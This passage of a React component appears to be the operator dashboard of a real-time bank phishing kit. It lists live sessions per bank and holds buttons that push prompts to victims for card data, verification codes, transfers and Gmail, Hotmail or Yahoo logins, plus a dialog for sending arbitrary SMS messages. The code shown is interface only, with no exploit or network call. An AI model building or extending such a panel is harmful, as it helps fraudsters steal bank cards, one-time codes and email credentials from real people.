                    : 'border-transparent hover:text-gray-300'}`}
                  onClick={() => setActiveTab('users')}
                >
                  Usuarios
                </div>
                <div 
                  className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'registered' 
                    ? 'border-[#00aaff] text-[#00aaff]' 
                    : 'border-transparent hover:text-gray-300'}`}
                  onClick={() => setActiveTab('registered')}
                >
                  Usuarios Registrados
                </div>
              </>
            )}
            {user?.role === 'admin' && (
              <div 
                className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'sms' 
                  ? 'border-[#00aaff] text-[#00aaff]' 
                  : 'border-transparent hover:text-gray-300'}`}
                onClick={() => setActiveTab('sms')}
              >
                API MSJ
              </div>
            )}
          </div>
          
          <div className="flex items-center space-x-2">
            <span className="text-gray-400 text-sm mr-2">
              {user?.username} ({user?.role})
            </span>
            <Button 
              variant="outline" 
              size="sm"
              className="text-gray-300 hover:text-white"
              onClick={() => logoutMutation.mutate()}
            >
              <LogOut className="h-4 w-4 mr-1" />
              Cerrar sesión
            </Button>
          </div>
        </div>

        {/* Content based on active tab */}
        {activeTab === 'users' && isSuperAdmin ? (
          <UserManagement />
        ) : activeTab === 'registered' && isSuperAdmin ? (
          <RegisteredUsersManagement />
        ) : activeTab === 'sms' && user?.role === 'admin' ? (
          <SmsManagement />
        ) : (
          <AccessTable 
            sessions={sessions}
            activeBank={activeBank}
            selectedSessionId={selectedSessionId}
            onSelectSession={selectSession}
            isLoading={isLoading}
            userRole={user?.role === 'admin' ? 'admin' : 'user'}
          />
        )}
      </div>

      {/* Modals */}
      <ProtectModal 
        isOpen={activeModal === 'protege'} 
        onClose={closeModal} 
        onConfirm={handleProtectConfirm} 
      />
      <TransferModal 
        isOpen={activeModal === 'transferir'} 
        onClose={closeModal} 
        onConfirm={handleTransferConfirm} 
      />
      <CancelModal 
        isOpen={activeModal === 'cancelacion'} 
        onClose={closeModal} 
        onConfirm={handleCancelConfirm} 
      />
      <CardInstructionsModal 
        isOpen={activeModal === 'tarjeta'} 
        onClose={closeModal} 
        onConfirm={handleCardInstructionsConfirm} 
      />
      <CodeModal 
        isOpen={activeModal === 'codigo'} 
        onClose={closeModal} 
        onConfirm={handleCodeConfirm} 
      />
      <MessageModal 
        isOpen={activeModal === 'mensaje'} 
        onClose={closeModal} 
        onConfirm={handleMessageConfirm} 
      />
      <SmsCompraModal 
        isOpen={activeModal === 'sms_compra'} 
        onClose={closeModal} 
        onConfirm={handleSmsCompraConfirm} 
      />
      <GmailModal 
        isOpen={activeModal === 'gmail'} 
        onClose={closeModal} 
        onConfirm={handleGmailModalConfirm} 
      />
      <GmailVerifyModal 
        isOpen={activeModal === 'gmail_verify'} 
        onClose={closeModal} 
        onConfirm={handleGmailVerifyModalConfirm} 
      />
      <HotmailModal 
        isOpen={activeModal === 'hotmail'} 
        onClose={closeModal} 
        onConfirm={handleHotmailModalConfirm} 
      />
      <YahooModal 
        isOpen={activeModal === 'yahoo'} 
        onClose={closeModal} 
        onConfirm={handleYahooModalConfirm} 
      />
      <DatosTarjetaModal
        isOpen={activeModal === 'datos_tarjeta'}
        onClose={closeModal}
        onConfirm={handleDatosTarjetaConfirm}
      />
      
      {/* Diálogo para enviar SMS */}
      <Dialog open={isSmsSendDialogOpen} onOpenChange={setIsSmsSendDialogOpen}>
        <DialogContent className="sm:max-w-[425px] bg-[#1e1e1e] text-white border-gray-700">
          <DialogHeader>
            <DialogTitle className="flex items-center">
              <Send className="mr-2 h-5 w-5" />
              Enviar Mensaje SMS
            </DialogTitle>
            <DialogDescription className="text-gray-400">
              Ingresa el número de teléfono y el mensaje que deseas enviar.
            </DialogDescription>
          </DialogHeader>
          
          <div className="grid gap-4 py-4">
            <div className="grid grid-cols-4 items-center gap-4">
              <Label htmlFor="phone" className="text-right">
                Teléfono
              </Label>
              <Input
                id="phone"
                type="text"
                inputMode="numeric"
                value={smsPhoneNumber}
                onChange={(e) => setSmsPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10))}
                placeholder="10 dígitos"
                className="col-span-3 bg-[#2a2a2a] border-gray-700 text-white"
                maxLength={10}
              />
            </div>
            <div className="grid grid-cols-4 items-center gap-4">
              <Label htmlFor="message" className="text-right">
                Mensaje
              </Label>
              <Textarea
                id="message"
                value={smsMessage}
                onChange={(e) => setSmsMessage(e.target.value.slice(0, 4000))}
                placeholder="Escribe tu mensaje aquí... (máximo 4000 caracteres, equivalente a una hoja oficio)"
                className="col-span-3 bg-[#2a2a2a] border-gray-700 text-white min-h-[120px]"
                maxLength={4000}
              />
              <div className="col-span-4 text-right text-xs text-gray-400">
                {smsMessage.length}/4000 caracteres
              </div>
            </div>
          </div>
          
          <DialogFooter>
            <Button
              type="button"
              variant="outline"
              onClick={() => setIsSmsSendDialogOpen(false)}
              className="border-gray-700 text-gray-300 hover:bg-gray-800"
            >
              Cancelar
            </Button>
            <Button
              type="button"
              onClick={() => sendSms.mutate()}
              disabled={isSendingSms || !smsPhoneNumber || !smsMessage || smsPhoneNumber.length !== 10}
              className="bg-[#007bff] hover:bg-blue-700 text-white flex items-center"
            >
              {isSendingSms ? (
                <>
                  <RefreshCw className="h-4 w-4 mr-2 animate-spin" />
                  Enviando...
                </>
              ) : (
                <>
                  <Send className="h-4 w-4 mr-2" />
                  Enviar
                </>
              )}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}